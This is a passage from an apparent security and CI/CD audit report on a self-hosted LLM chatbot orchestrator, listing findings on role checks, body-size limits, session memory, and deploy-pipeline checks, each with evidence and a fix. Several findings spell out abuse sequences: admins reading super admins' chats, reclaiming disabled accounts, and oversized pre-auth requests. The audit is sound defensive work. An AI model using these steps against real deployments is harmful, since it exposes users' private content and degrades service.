outranks. The reachable set is accounts that are ALREADY disabled or removed. (2) There is no role escalation: assignable_roles (rbac.py:103+) stops an ADMIN inviting above MEMBER, so the claim is always at member rank. (3) The ON CONFLICT DO UPDATE is worse than 'silently rewrites': claiming a disabled SUPER_ADMIN's row DOWNGRADES that membership to member, and the audit trail records only user_invited + invitation_accepted, never role_changed. Severity P2 rather than P1 because it needs an already-trusted ADMIN plus a pre-existing non-active account, and because MEMBERS_MANAGE already lets an admin reset any outranked ACTIVE member's password (admin_api.py:336-352) - the novel gain is reaching accounts the admin surface deliberately hides.

*Exploitable today.* yes, by anyone holding the ADMIN role, against any users row that is not (active AND a member): a departed employee, a deactivated peer admin, a deactivated super admin, or a legacy row with no membership. Sequence: DELETE /admin/api/members/{id} (only for someone they outrank) or wait for an already-disabled account, then POST /admin/api/invitations {email}, then POST /auth/invitations/accept {token, password}. No super-admin involvement at any step.

*Fix.* In admin_api.create_invitation (orchestrator/app/authn/admin_api.py:561-569), replace the active-only 409 with: if a users row exists at all, refuse unless the actor outranks that account's last known membership role, and mark the invitation reclaim=True. In store.accept_invitation (orchestrator/app/authn/store.py:684-697) refuse to reset an existing account's password unless that flag is set, keep the existing membership role instead of ON CONFLICT DO UPDATE, and call store.revoke_user_sessions(user_id, reason=...) on claim. Audit the reclaim as its own action with the previous role in meta.

*Fix risk.* Code-only, orchestrator restart, no model restart, no production window. It changes a real workflow - re-inviting a returning ex-employee stops being a plain invite - so the admin UI needs a matching error sentence, and the existing invitation tests that cover 'invited an address that already has an account' (the case store.py:686-688 documents) will need updating.

### F029 — An ADMIN can read a SUPER_ADMIN's (and a peer admin's) conversations, uploads and reports — the content-inspection routes never apply the outranks rank rule

**P2** · authn-authz · `orchestrator/app/authn/admin_api.py:402` · verdict **CONFIRMED**

*Evidence.* Cap.WORKSPACE_CONTENT_READ is granted to ADMIN at rbac.py:61 (inside _ADMIN_CAPS). Every content route gated on it performs ONLY the membership/workspace check: admin_api.py:382 `await _target_member(principal, user_id)`, :410 (member_conversation), :461 (member_uploads), :487 (member_reports), :937 (download_member_upload), :988 (download_member_report) — none calls `outranks`. Contrast every management route, which does: admin_api.py:204 (`change_status`), :250 (`remove_member`), :316 (`revoke_member_sessions`), :346 (`reset_member_password`), :721 (`set_member_access`) all guard with `if not outranks(principal.role, target["role"]): raise HTTPException(403, "You cannot manage that member.")`. rbac.py:88-91 states the rule as "An admin must never manage an equal-or-higher role", and docs/AUTH.md:60-61 repeats it for deactivate/remove/reset/revoke — reading content is simply outside that list. The rank helper exists and is imported at admin_api.py:28.

*Impact.* A workspace admin can open the audited viewer against the super admin's user id and read every message of their private conversations, and download their uploads and generated reports. In a deployment where the super admin is the owner/CEO (the role this codebase's own docs describe), the day-to-day admin role reads the owner's chats. It is audited (`admin_viewed_conversation`, admin_api.py:422-430) — but the audit log itself is behind Cap.AUDIT_READ, which ADMIN does not have (rbac.py:68-71), so the admin can read the content and the person who could notice is the very person being read.

*Verification.* Verified route by route. Cap.WORKSPACE_CONTENT_READ is in _ADMIN_CAPS (rbac.py:61). The six routes are admin_api.py:375 member_conversations, :402 member_conversation, :453 member_uploads, :482 member_reports, :920 download_member_upload, :972 download_member_report - each one's only check is `await _target_member(principal, user_id)`, which (admin_api.py:49-63) verifies existence and same-workspace membership and nothing else. Every management route by contrast carries the rank guard: :204 change_status, :250 remove_member, :316 revoke_member_sessions, :346 reset_member_password, :721 set_member_access all do `if not outranks(principal.role, target["role"]): raise HTTPException(403, ...)`. outranks is imported at admin_api.py:28 and rbac.py:88-91 states the rule. The audit note is right too: member_conversation writes admin_viewed_conversation at :422-430, and AUDIT_READ is not in _ADMIN_CAPS (rbac.py:55-64), so the reader cannot see their own trail - though the super admin can, so this is detectable after the fact, not invisible.

*Exploitable today.* yes, by anyone holding ADMIN. GET /admin/api/members?role=super_admin (MEMBERS_READ is an admin cap) gives the id, then GET /admin/api/members/{id}/conversations/{cid} returns full message content. No further precondition.

*Fix.* After `target = await _target_member(principal, user_id)` in each of the six routes, add `if user_id != principal.user_id and not outranks(principal.role, target["role"]): raise HTTPException(status_code=404, detail="No such member.")` - 404 to match the surface's disclosure discipline. Add the same line to GET /admin/api/members/{user_id}/sessions (admin_api.py:284), which has the same omission (see missed finding). If peer-reading is intended, say so in the Cap.WORKSPACE_CONTENT_READ docstring at rbac.py:31-33 and in docs/AUTH.md so it is a decision rather than an omission.

*Fix risk.* Code-only, orchestrator restart, no model restart, no production window. Behavioural change an operator will notice: the admin viewer starts 404ing for peers and super admins, so any admin runbook that relies on reading a peer's chat breaks. Existing admin-viewer tests that use a super-admin target will need their fixtures re-ranked.

### F033 — No request-body size limit anywhere: PUT /auth/preferences validates size only after the whole JSON body is parsed

**P2** · authn-authz · `orchestrator/app/authn/api.py:338` · verdict **ADJUSTED** · blocks release

*Evidence.* authn/api.py:335-341 — `async def put_preferences(body: PreferencesRequest, request: Request): principal = await require_principal(request); if len(str(body.prefs)) > 20_000: raise HTTPException(status_code=422, detail="Preferences too large.")`. The 20 KB check runs after FastAPI has already read and JSON-decoded the entire body into `body.prefs`. Grepping orchestrator/app/config.py, orchestrator/app/main.py and orchestrator/Dockerfile for a body cap finds only `self.upload_max_mb: int = _int("UPLOAD_MAX_MB", 200)` (config.py:725), which governs the upload routes, not JSON bodies. The uvicorn CMD (orchestrator/Dockerfile:76-77) passes only --host, --port and --timeout-graceful-shutdown, so no h11 body limit is configured either.

*Impact.* Any authenticated caller can POST an arbitrarily large JSON body to any route and force the orchestrator to buffer and parse it before a single validation runs — on a box where the orchestrator shares unified memory with the model server, that is a cheap way to disturb inference. Low severity today because it needs a session; it becomes P1-shaped the moment /v1/responses accepts bodies from API-key holders outside the company.

*Verification.* Confirmed, and understated in one important way. orchestrator/app/authn/api.py:335-341 is `async def put_preferences(body: PreferencesRequest, request: Request): principal = await require_principal(request); if len(str(body.prefs)) > 20_000: raise HTTPException(422, ...)`. Grepping orchestrator/ for a body cap finds nothing - the only size setting is upload_max_mb at config.py:725, which governs the upload routes - and orchestrator/Dockerfile:76-77 is `CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8080", "--timeout-graceful-shutdown", "90"]`, so no h11 limit either. The understatement: `require_principal` is called inside the function body, not as a Depends, while `body: PreferencesRequest` is materialised by FastAPI during dependency solving - so the entire body is read and JSON-decoded BEFORE anything authenticates the caller. The finding says 'any authenticated caller'; it is actually any caller who can open a TCP connection to :8080. That raises it from a nuisance to a pre-auth resource sink, which is why I keep P2 rather than dropping it. Same shape applies to every other JSON route, including POST /auth/login. Note the frontend path is partly protected by accident - the artifacts proxy bounds POST bodies to 1024 bytes (frontend/app/api/artifacts/[[...path]]/route.ts readBounded) - but lib/proxy.ts does `await req.text()` with no bound at all.

*Exploitable today.* yes, unauthenticated, from the LAN/tailnet: POST a multi-hundred-MB JSON body to http://<host>:8080/auth/preferences (or /auth/login) and the orchestrator buffers and parses it before returning 401. Through the tunnel the Cloudflare 100 MB edge wall caps it, and the frontend is the only internet ingress.

*Fix.* Add one ASGI middleware in orchestrator/app/main.py, registered before the existing _reject_cross_site_writes at :242, that rejects with 413 when Content-Length exceeds a per-prefix cap (small for /auth and /admin, larger for /uploads which already streams) before the body is read, and counts bytes for chunked requests that declare no Content-Length. Keep the 20 KB check at authn/api.py:338 as the semantic limit. Give /v1 its own documented cap returning the typed error envelope.

*Fix risk.* New middleware on every request path, so a cap set too low silently 413s a legitimate route - the uploads and chunked-part PUTs are the ones to size carefully, and the streaming /uploads path must be exempted or bounded by upload_max_mb rather than by the JSON cap. Orchestrator container restart; no model restart, no production window.

### N006 — An ADMIN can read per-person usage analytics through Cap.WORKSPACE_READ, contradicting ANALYTICS_READ's explicit super-admin-only rule

**P2** · authn-authz · `orchestrator/app/authn/admin_api.py:780` · verdict **FOUND IN VERIFICATION**

*Evidence.* rbac.py:35-40 documents Cap.ANALYTICS_READ as 'SUPER_ADMIN only - an admin runs the workspace's people, not its infrastructure, and per-person consumption is closer to the audit log than to the member list. It is absent from _ADMIN_CAPS deliberately; do not add it there', and analytics_api.py:46 gates the whole /admin/api/analytics/* console on it (Gate = Depends(require_capability(Cap.ANALYTICS_READ))). But admin_api.py:780-782 exposes GET /admin/api/analytics and admin_api.py:826-830 GET /admin/api/analytics/export on Depends(require_capability(Cap.WORKSPACE_READ)) - and WORKSPACE_READ is the first entry of _ADMIN_CAPS at rbac.py:57. The payload is exactly what the docstring says an admin must not have: admin_api.py:765-777 _analytics_member_row returns, per member, id, name, email, role, status, last_active_at, messages, answers, conversations, a count for every entry of store._TOOL_ROUTES, and tool_runs; admin_api.py:823 returns one such row per member. The two routers sit under the same /admin/api/analytics prefix, which is how the contradiction went unnoticed.

*Impact.* A workspace admin gets the per-person consumption table and can export it as CSV, which the capability model states in writing is a super-admin-only read. It is the same class of decision as F029 (admin reading above their rank) but through a different cap, and unlike the content viewer the plain GET is not audited - only the /export route records anything.

*Fix.* Change the dependency on admin_api.py:783 and :830 from require_capability(Cap.WORKSPACE_READ) to require_capability(Cap.ANALYTICS_READ), or - if an admin is genuinely meant to see workspace totals - split the response so the summary/daily/routes blocks stay on WORKSPACE_READ and the `members` array plus the CSV export require ANALYTICS_READ. Either way make rbac.py:35-40 and docs/AUTH.md say which it is. Code-only; orchestrator container restart, no model restart, no production window. It will remove a table the admin analytics page currently renders, so the frontend needs to handle the 404 that require_capability returns.

### N008 — In-process SessionMemory is an unbounded dict keyed by an unvalidated client-supplied session_id - a per-principal namespace that never evicts

**P2** · authn-authz · `orchestrator/app/memory.py:15` · verdict **FOUND IN VERIFICATION**

*Evidence.* memory.py:13-32: `self._sessions: Dict[str, List[dict]] = {}` with add_exchange doing `msgs = self._sessions.setdefault(session_id, [])`. The per-key list is trimmed to max_turns*2 - but the NUMBER of keys is never bounded, there is no TTL, and the only removal is the explicit clear(session_id) at :31. The key is built at main.py:1738 as `scoped_session = f"u{viewer}-{request.session_id}"`, and request.session_id is declared at main.py:648 as plain `session_id: str = "default"` with no Field pattern and no max_length. main.py:3309 calls `memory.add_exchange(scoped_session, text, answer)` on EVERY completed generation, unconditionally - not only for the bare-API path - and main.py:2197 reads it back. So each distinct session_id a caller invents permanently costs one dict entry holding up to max_turns*2 full message bodies, in the orchestrator process.

*Impact.* An authenticated caller who rotates session_id grows orchestrator RSS without bound, and the key itself is unbounded-length attacker text. On this box that memory is unified with the model server (the main model is TP=2 across both Sparks), so orchestrator growth is a cheap way to pressure inference - the same argument F033 makes about body buffering, but here the bytes are retained rather than transient. Today it needs a session; the moment /v1 accepts API keys from outside the company, an external key holder drives it, and a `session` or `conversation` identifier is exactly the kind of field a public API hands to the client.

*Fix.* Bound the structure and the key: give ChatRequest.session_id a Field(max_length=64, pattern=r'^[A-Za-z0-9_-]{1,64}$') at main.py:648 (the same alphabet _CONVERSATION_ID_RE already enforces at main.py:212), and convert SessionMemory._sessions to an LRU with a hard key ceiling plus an idle TTL, evicting oldest-first. Note that memory.py's module docstring already admits 'Phase 1 keeps memory in-process on purpose' - the fix is a cap, not an architecture change. Code-only; orchestrator container restart, no model restart, no production window. Eviction is user-visible only for the bare-API path (a script that reuses a session_id after a long idle gap loses its in-process history); the UI path passes history_messages or a conversation_id and is unaffected, per main.py:2197.

### F068 — The verify step named "A rolling deploy did not restart the main model" asserts nothing and can never fail

**P2** · cicd · `.github/workflows/pipeline.yml:1004` · verdict **CONFIRMED** · claimed P1

*Evidence.* pipeline.yml:1004-1009 in full:
```
- name: A rolling deploy did not restart the main model
  run: |
    set -u
    vllm_status="$(docker ps --filter name=sf-local-ai-vllm-1 --format '{{.Status}}' || echo '?')"
    echo "- main model container: \`${vllm_status}\` — a routine deploy must NOT have reset this clock" >> "$GITHUB_STEP_SUMMARY"
    echo "$vllm_status"
```
There is no comparison, no baseline, no `[ ]` test and no non-zero exit path. `docker ps --filter` prints an empty string when the container is absent, and the step still exits 0. The repository already contains the correct implementation: scripts/deploy-smoke.sh:23-28 documents "MODEL CLOCK  The main model container did not restart... With --baseline <a record.json from before the deploy> this is an assertion rather than an observation" — and a grep across scripts/*.sh, `techsara` and .github/ shows deploy-smoke.sh is called by nothing.

*Impact.* The one invariant the deploy exists to preserve — that a routine deploy does not reload the 35B model and take the product down for 15-25 minutes — is only printed, never checked. If `TECHSARA_PRESERVE_MAIN_MODEL` regresses, or a compose change makes the vllm service definition dirty, the pipeline reports a fully green deploy while the engine reloaded. The step's name is a claim the code does not make, which is worse than having no step: it makes reviewers believe the invariant is covered.

*Verification.* Read pipeline.yml:1004-1009 in full. The body is `set -u`; `vllm_status="$(docker ps --filter name=sf-local-ai-vllm-1 --format '{{.Status}}' || echo '?')"`; two echoes. No comparison, no `[ ]`, no baseline, no non-zero exit path — the step cannot fail. The container name is correct (`docker ps --filter name=sf-local-ai-vllm-1` => `sf-local-ai-vllm-1 Up 8 hours (healthy)`), so it is genuinely just an observation, and `docker ps --filter` on an absent container prints an empty string at exit 0. The correct implementation exists and is dead: scripts/deploy-smoke.sh:23-28 documents "MODEL CLOCK ... With --baseline <a record.json from before the deploy> this is an assertion rather than an observation", and `grep -rn 'deploy-smoke\|deploy-rollback' --include='*.sh' --include='*.yml' --include='*.py' techsara .` finds no caller outside the scripts' own usage strings. deploy.sh:438 already captures a pre-deploy record and deploy.sh:513 sets TECHSARA_PRESERVE_MAIN_MODEL, so the inputs for a real assertion are on the floor.

*Exploitable today.* not an attack; it is a missing invariant check. It bites when TECHSARA_PRESERVE_MAIN_MODEL regresses or a compose change dirties the vllm service definition: the pipeline reports a fully green deploy while the 35B engine reloaded. I downgrade from P1 because that failure is loudly self-announcing (15-25 minutes of the product answering nothing), so the step's silence delays diagnosis rather than hiding the outage.

*Fix.* In the deploy job, before `techsara up`, capture `docker inspect -f '{{.State.StartedAt}} {{.RestartCount}}' sf-local-ai-vllm-1` into $GITHUB_ENV; in verify, fail when StartedAt moved and DEPLOY_WAS_FULL != true. Better: pass deploy.sh's existing record path through and call `scripts/deploy-smoke.sh --manifest "$MANIFEST" --baseline "$RECORD"`, which asserts digest promotion, restart loops and the model clock together.

*Fix risk.* Workflow-only; no container, model or production window. The one risk is a false red on a legitimate `--full` deploy, so the assertion must be conditioned on DEPLOY_WAS_FULL.

### F069 — The deploy summary's `tail -40 .runtime/logs/deploy-*.log` has never worked: GNU tail rejects the obsolescent -N form with more than one file

**P2** · cicd · `.github/workflows/pipeline.yml:919` · verdict **CONFIRMED**

*Evidence.* pipeline.yml:919 `tail -40 .runtime/logs/deploy-*.log >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true`. There are 126 matching files in the production checkout (`ls -1 .runtime/logs/deploy-*.log | wc -l` => 126). Reproduced on this box with GNU coreutils 9.4: `tail -40 f1 f2` => `tail: option used in invalid context -- 4`, exit 1, no output; `tail -40 f1` => works; `tail -n 40 f1 f2` => works with `==> f1 <==` headers. The stderr is discarded by `2>/dev/null` and the non-zero exit swallowed by `|| true`. The recovery job gets this right at pipeline.yml:1059-1060 by selecting the newest file first and then tailing a single path.

*Impact.* Every deploy's run summary has silently omitted the deploy log tail since the second deploy log existed. The step still reports success, so nobody notices. When a deploy is being diagnosed from the Actions tab — the exact moment the tail is for — the summary shows the commit, the container table and then nothing.

*Verification.* Read pipeline.yml:919 in the "Report what is now serving" step: `tail -40 .runtime/logs/deploy-*.log >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true`. Reproduced on this box: `ls -1 .runtime/logs/deploy-*.log | wc -l` => 126, and `tail -40 .runtime/logs/deploy-*.log` => stderr "tail: option used in invalid context -- 4", exit 1, no output (GNU coreutils 9.4). `2>/dev/null` eats the message and `|| true` eats the exit code. The recovery job gets it right at pipeline.yml:1058-1060 by selecting the newest file with find/sort and tailing a single path.

*Exploitable today.* no — this is an observability defect, not a security one. It bites every deploy summary, and specifically at the moment the tail exists for: diagnosing a deploy from the Actions tab.

*Fix.* Copy the recovery job's own idiom into the :919 step: `newest="$(find .runtime/logs -maxdepth 1 -name 'deploy-*.log' -printf '%T@ %p\\n' | sort -rn | head -1 | cut -d' ' -f2-)"; [ -n "$newest" ] && tail -n 40 "$newest" >> "$GITHUB_STEP_SUMMARY"`. Drop the `2>/dev/null` — that is what hid it.

*Fix risk.* None. Workflow-only, no restart, no window.

### F071 — The pip-audit step can never report a non-success outcome, so the supply-chain summary table always says "success" for Python dependencies

**P2** · cicd · `.github/workflows/pipeline.yml:488` · verdict **CONFIRMED**

*Evidence.* pipeline.yml:485-494:
```
- name: Python dependency audit (advisory)
  id: pipaudit
  continue-on-error: true
  run: |
    python -m pip install -q pip-audit==2.10.1
    for req in orchestrator/requirements-dev.txt sync-worker/requirements.txt; do
      echo "::group::pip-audit $req"
      pip-audit --progress-spinner off -r "$req" || echo "FINDINGS in $req"
      echo "::endgroup::"
    done
```
The `|| echo` swallows pip-audit's exit code, and the loop's last command is `echo "::endgroup::"`, so the step always exits 0 — `continue-on-error` never engages and `steps.pipaudit.outcome` is always `success`. That value is then rendered as fact at pipeline.yml:534: `echo "| python deps (pip-audit) | advisory | ${{ steps.pipaudit.outcome }} |"`. The npm step immediately below (pipeline.yml:496-500) has no `|| true` and therefore does report a real outcome, which shows the intended design.

*Impact.* The "Supply chain" table in every run summary states that the Python dependency audit succeeded whether or not it found vulnerabilities. Anyone reading the summary — the only place this advisory scan surfaces — gets a green cell that carries no information. Findings are still in the collapsed log group, but nothing points at them. For a build that is about to add a public API surface and its dependency tree, an advisory scan whose headline is always green is an observability gap worth closing.

*Verification.* Read pipeline.yml:485-494. The loop body is `pip-audit --progress-spinner off -r "$req" || echo "FINDINGS in $req"` (:492) and the last command in each iteration is `echo "::endgroup::"` (:493), so the step's exit status is always 0, `continue-on-error: true` never engages, and `steps.pipaudit.outcome` is always `success`. That value is rendered as fact in the summary table at :534. The npm step directly below (:496-500) has no `|| true` and does report a real outcome, which shows the intended design.

*Exploitable today.* no — an always-green advisory cell is an observability gap, not an exploit. It matters because the summary is the only place this scan surfaces.

*Fix.* Exactly as proposed: drop the `|| echo`, capture rc per requirement file, and `exit "${worst:-0}"` at the end. continue-on-error then turns the step amber, the summary row becomes true, and the job still passes.

*Fix risk.* None beyond a newly amber step on the first run that finds an advisory. Workflow-only.

### F074 — There is no rollback path in the pipeline, and the rollback script that exists is called by nothing

**P2** · cicd · `.github/workflows/pipeline.yml:1024` · verdict **CONFIRMED**

*Evidence.* grep of `scripts/` in pipeline.yml finds only `scripts/deploy.sh` (invoked at :866 and :887) and `scripts/cluster-status.sh` (printed as advice at :1076). The `recovery` job deliberately does not act — pipeline.yml:1080-1083 `echo "Diagnostics only. No container was restarted and no commit was moved by this job."; exit 1` — and prints a manual command at :1075. Meanwhile scripts/deploy-rollback.sh (15 KB) exposes a complete interface (`--list`, `--to DIR|MANIFEST|RECORD`, `--dry-run`, `--yes`, `--services`, `--i-accept-schema-drift`) and refuses a rollback whose target code does not know an applied migration (deploy-rollback.sh:26-30). A grep across scripts/*.sh, `techsara` and .github/ shows no caller.

*Impact.* The only automatic rollback is the one inside deploy.sh's own health gate, which fires while deploy.sh is still running. Once `verify` is the thing that fails — which is the documented case (pipeline.yml:1016-1019: "deploy.sh has already declared the stack healthy — so a verify failure means something degraded afterwards") — the only route back is a human SSHing to the box. The build's assignment explicitly asks for a rollback path and the capability is already written and tested; it just is not reachable from the Actions tab.

*Verification.* Verified both halves. `grep -rn 'deploy-smoke\|deploy-rollback\|deploy-record' --include='*.sh' --include='*.yml' --include='*.py' techsara .` returns, outside docs: only deploy-rollback.sh's own usage lines (:5-6), its lock call (:266) and its call to deploy-record.sh (:277); deploy-smoke.sh's usage line (:4); deploy.sh:438 calling deploy-record.sh. No workflow and no other script invokes deploy-rollback.sh (15,872 bytes, executable) or deploy-smoke.sh. The recovery job deliberately does not act — pipeline.yml:1081-1083 prints "Diagnostics only" and exits 1 — and pipeline.yml:1073-1077 prints a manual command instead. pipeline.yml:1016-1019 states the exact case this leaves uncovered: by the time verify fails, deploy.sh has already passed its own health gate, so its built-in rollback will not fire.

*Exploitable today.* not an attack. The operational gap is real: after a verify failure the only route back is a human on the box, and the capability to do it safely already exists and is unreachable from the Actions tab.

*Fix.* Add a workflow_dispatch-only `rollback` job: runs-on [self-hosted, dgx-spark], environment: production, concurrency group deploy-dgx-spark, `if:` carrying github.ref == 'refs/heads/main' (P4 requires it), reading a `rollback_to` input through env: (P6 forbids interpolating it into run:), calling `scripts/deploy-rollback.sh --to "$ROLLBACK_TO" --yes`. Never pass --i-accept-schema-drift from CI.

*Fix risk.* Real: this creates a new button that recreates containers on production. It must not be added before F066/F064 are closed, since it is a new self-hosted entry point. Running it is a production window by definition, and a rollback whose target predates an applied migration is refused by deploy-rollback.sh:26-30 — keep that refusal.

### F075 — DEPLOY_BRANCH is documented as a live repository variable but the pipeline stopped reading it; every push-deploy now yanks the shared working tree onto main

**P2** · cicd · `.github/workflows/pipeline.yml:800` · verdict **CONFIRMED**

*Evidence.* pipeline.yml:800 `DEPLOY_BRANCH: ${{ inputs.branch || github.ref_name }}` — derived from the ref, with the repository variable no longer consulted (the reasoning is at :793-799). But `gh api repos/.../actions/variables` still returns `{"name":"DEPLOY_BRANCH","value":"dev"}`, and README.md:998-1000 still documents it as a live control: "| `DEPLOY_BRANCH` | The checkout is left on a **detached HEAD** ... | e.g. `dev` -> the checkout is left **on that branch** |". On a push to main, `github.ref_name` is `main`, so deploy.sh lands the production checkout on `main`. The production checkout is currently on `dev` at 4e28fcc (`git -C /home/techsphere/Documents/project/personal-LLM-Chabot rev-parse --abbrev-ref HEAD` => `dev`), and the most recent deploy log ends `DEPLOYED b047cc1... checkout is on main`.

*Impact.* Two things. First, the README documents a control that does nothing, so an operator who sets or clears the variable during an incident gets no effect and no message. Second, and more concretely for this programme: the deploy root is a shared working tree used by several concurrent sessions, and every push-deploy silently moves it from `dev` to `main`. Any session with in-progress work anchored to `dev` finds the tree moved under it mid-task, and running containers bind-mount directories out of that tree.

*Verification.* pipeline.yml:800 sets `DEPLOY_BRANCH: ${{ inputs.branch || github.ref_name }}` in the deploy job's env:, which overrides any repository variable of the same name for scripts/deploy.sh (deploy.sh:71 reads it from the environment). The stale variable still exists: `gh api .../actions/variables` => {"name":"DEPLOY_BRANCH","value":"dev"}. README.md:999 still documents it as a live control ("e.g. `dev` -> the checkout is left on that branch") and README.md:1027 still says the dispatch input's "blank uses DEPLOY_BRANCH" — both now false; blank uses github.ref_name. The concrete consequence is confirmed on the box: the production checkout is a shared working tree (`git -C /home/techsphere/Documents/project/personal-LLM-Chabot rev-parse --abbrev-ref HEAD` => dev) and the newest deploy log, .runtime/logs/deploy-20260912-210025.log, ends "DEPLOYED b047cc16... checkout is on main".

*Exploitable today.* no attacker involved. It bites operationally: an operator who sets or clears DEPLOY_BRANCH during an incident gets no effect and no message, and every push-deploy moves the shared working tree from dev to main under whichever sessions are working in it — with running containers bind-mounting directories out of that tree.

*Fix.* Delete the stale DEPLOY_BRANCH repository variable and correct README.md:999 and :1027 to say the branch is derived from the deployed ref, with inputs.branch as the only override. If the shared-checkout collision is the concern, set the TECHSARA_DEPLOY_ROOT repository variable (already honoured at pipeline.yml:780) to a dedicated clone.

*Fix risk.* Deleting the variable and editing the README change nothing at runtime. Repointing TECHSARA_DEPLOY_ROOT is NOT cosmetic: .env, .runtime/ and every bind mount live under the current root, so a new root would need the whole state tree moved and the stack recreated — a production window, and the wrong thing to do mid-programme.

### N022 — P5 only checks that a job DECLARES permissions, never what it declares — a job can grant itself contents: write and pass

**P2** · cicd · `.github/workflows/scripts/workflow_policy.py:222` · verdict **FOUND IN VERIFICATION**

*Evidence.* _perm_is_restrictive (workflow_policy.py:93-103) is applied only to the top-level block (:215). The per-job loop at :217-223 is a bare presence test: `if "permissions" not in job: f.fail(...)`. Reproduced: a job with `permissions: {contents: write, id-token: write, packages: write}` gives `workflow policy: OK (P1-P6) / EXIT=0`. The repo's default is read (`gh api .../actions/permissions/workflow` => default_workflow_permissions "read"), but an explicit job-level block overrides that default upward. Related, same file: the P6 INJECTABLE regex (:47-49) covers only github.event, github.head_ref, inputs. and github.event.inputs. — it does not cover github.ref_name, github.actor, github.triggering_actor, or needs.*/steps.* outputs.

*Impact.* Defence-in-depth only today — fork-PR tokens are read-only regardless, and the three collaborators already have write access — but it means the gate cannot catch the shape it exists to catch: a job that quietly acquires a write token or an OIDC identity. A developer platform that later adds an OIDC-federated publish or a release job will be adding exactly this, with no gate on it.

*Fix.* Apply _perm_is_restrictive to each job's permissions block as well as the top-level one, with an explicit allowlist of job ids permitted to exceed read. Extend INJECTABLE with github.ref_name, github.actor and github.triggering_actor. Workflow-script change only; no restart.

### N023 — No CI gate can ever see a newly published 0.0.0.0 port: the blocking trivy pass excludes misconfig by design

**P2** · cicd · `.github/workflows/pipeline.yml:524` · verdict **FOUND IN VERIFICATION**

*Evidence.* The security job runs two trivy passes: pipeline.yml:517 `scan vuln,misconfig CRITICAL,HIGH,MEDIUM 0 || true` (advisory, exit-code 0, further neutered by `|| true`) and :524 `scan vuln CRITICAL 1` (blocking, vuln scanner only — the comment at :519-523 says misconfiguration findings are deliberately excluded). So Dockerfile/compose misconfiguration can never fail the build. The launcher suite tests the OVERLAY's host_ip behaviour (launcher/tests/test_compose_overlays.py:885-955) but nothing asserts that every `ports:` entry in docker-compose.yml carries an explicit host_ip — and docker-compose.yml:144 is `- "8000:30000"`, the bare form that produced the 0.0.0.0 bind in F065. verify probes only loopback (pipeline.yml:964-969).

*Impact.* The system has no automated tripwire anywhere between a compose edit and a port open on the LAN. A developer-platform service — the /v1 API front end, a background-job worker, a webhook dispatcher — added with a bare `ports:` entry ships LAN-exposed, and every gate in the pipeline stays green. This is the mechanism that produced F065 in the first place, so it will produce it again.

*Fix.* Add a launcher unit test that renders every host fixture and asserts every published port has an explicit host_ip (and that anything not in an allowlist resolves to 127.0.0.1 or the cluster address); and add the `ss -lntH "sport = :${port}"` bind assertion to the verify job so a regression on the box is caught after deploy as well as before. Test + workflow change; no restart, no window.

### F035 — cancel_parked_chat_requests has no owner predicate and can cancel another user's queued generations

**P2** · database · `orchestrator/app/db.py:5980` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* `def cancel_parked_chat_requests(conversation_id: str, *, keep: Sequence[str]) -> int:` executes `UPDATE chat_requests SET status = 'cancelled', error = %s, updated_at = %s, finished_at = %s WHERE conversation_id = %s AND status = 'queued' AND NOT (intent_id = ANY(%s)) RETURNING intent_id` (db.py:5988-5995). There is no `user_id` in the WHERE clause, even though the table has one (`user_id integer NOT NULL REFERENCES users(id) ON DELETE CASCADE`, db.py:1576). It is called from /chat on every non-resumed send with the caller's own conversation key: `superseded = await db.run_in_thread(db.cancel_parked_chat_requests, conv_key_outer, keep=keep)` (main.py:1911-1913). Every other chat_requests mutation in the same file is either intent-scoped (`set_chat_request_status`, db.py:5804) or guarded at the route by an explicit `int(row["user_id"]) != viewer` comparison (main.py:1793-1804, main.py:3722, main.py:3818) — this one is guarded by neither.

*Impact.* Combined with the shared `u<id>-<session>` namespace above, a user who claims another user's bare-call key can cancel every request that user has parked `queued` waiting for the main model — exactly the rows the availability contract promises are never lost (db.py:1813-1822). The victim's question is silently marked 'replaced by a newer message' and the resume sweep will never run it. Independently of the namespace bug, this accessor is the one place in the chat_requests surface where ownership is not expressible, so any future caller (a background-job sweeper, an API key's cancel endpoint) inherits a cross-tenant write by default.

*Verification.* The code is exactly as quoted: db.py:5980-5996 updates chat_requests to 'cancelled' with `WHERE conversation_id = %s AND status = 'queued' AND NOT (intent_id = ANY(%s))` and no user_id, although the column exists (db.py:1576). There is exactly one caller (`grep cancel_parked_chat_requests` → main.py:1915 only). But that caller passes `conv_key_outer`, which by then is either (a) a conversation_id whose ownership was proven at main.py:1749-1770 — a victim's real conversation makes conv_owner != viewer and returns 404 before line 1915 — or (b) the caller's own `u{viewer}-{session_id}`. So there is no cross-tenant path to this UPDATE except through F034's synthetic namespace, and the finding's own P1 rating is premised on that combination. Standalone it is a missing rail, not a live cross-tenant write.

*Exploitable today.* No, not on its own. Only reachable cross-tenant by first squatting a `u<victim>-<session>` key (F034), and even then only against rows the victim parked `queued` waiting for the main model.

*Fix.* Add the owner to the statement, as the module's own rule requires (db.py:3616-3620): `def cancel_parked_chat_requests(conversation_id: str, user_id: int, *, keep: Sequence[str])` with `... AND user_id = %s ...`, and pass `viewer` at main.py:1913-1915. One call site, no schema change.

*Fix risk.* Behaviour-neutral today because every current call already runs under the owner; it only narrows. Orchestrator container restart; no model restart, no production window.

### F036 — workspace_id is denormalised text with no foreign key on every table a billing or quota query would join

**P2** · database · `orchestrator/app/db.py:967` · verdict **ADJUSTED** · claimed P1

*Evidence.* `usage_events.workspace_id text,` (db.py:967) — nullable, no REFERENCES. `query_traces.workspace_id text,` (db.py:1610) — same. `conversation_shares.workspace_id text NOT NULL,` (db.py:1071) — NOT NULL but still no REFERENCES. Contrast the tables that do it properly in the same migration: `workspace_memberships.workspace_id text NOT NULL REFERENCES workspaces(id) ON DELETE CASCADE` (db.py:636), `workspace_invitations.workspace_id … REFERENCES workspaces(id) ON DELETE CASCADE` (db.py:672), `audit_events.workspace_id text REFERENCES workspaces(id) ON DELETE SET NULL` (db.py:693). The V18 comment justifies the denormalisation for history retention ('A membership can be removed; the usage it generated still belongs in the workspace's history', db.py:965-966) — which argues for ON DELETE SET NULL, not for dropping referential integrity entirely.

